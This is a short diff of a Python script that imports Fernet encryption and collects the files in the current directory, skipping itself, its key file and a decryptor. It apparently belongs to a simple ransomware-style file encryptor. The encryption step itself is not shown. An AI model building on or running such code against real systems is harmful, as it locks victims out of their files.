@@ -21,7 +21,7 @@ from cryptography.fernet import Fernet #Import cryptography library
 files = []
 
 for file in os.listdir(): 
-    if file == "grindlewald.py" or file == "key.key": 
+    if file == "grindelwald.py" or file == "key.key" or file == "grindeldecrypt": 
         continue 
     if os.path.isfile(file): 
         files.append(file) 
